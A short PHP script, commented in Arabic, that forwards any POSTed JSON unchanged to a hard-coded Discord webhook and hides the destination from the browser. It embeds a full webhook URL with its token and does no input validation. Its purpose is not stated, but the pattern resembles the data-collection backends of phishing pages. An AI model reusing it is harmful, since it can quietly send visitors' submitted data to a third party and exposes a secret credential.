<?php
// منع الدخول المباشر للملف وسماح فقط بطلبات POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.1 403 Forbidden');
    exit('Access Denied');
}

// قراءة البيانات المبعوثة من الـ HTML
$input = json_decode(file_get_contents('php://input'), true);

if (!$input) {
    header('HTTP/1.1 400 Bad Request');
    exit('Invalid Data');
}

// الـ Webhook مخفي هنا تماماً في السيرفر ومستحيل يتشاف بالـ Ctrl + S أو F12
$webhook_url = 'https://canary.discord.com/api/webhooks/1514748698918260919/MQ00J75z635Xo6UFn3YOARzHyYjf2f4TTQ5UjAv9wLIRiV2G9aONEprhQs75jaJjav5D';

// إرسال البيانات إلى ديسكورد عبر cURL
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($input));

$response = curl_exec($ch);
curl_close($ch);

// إرجاع رد للمتصفح أن العملية تمت بنجاح
echo json_encode(['status' => 'success']);
?>
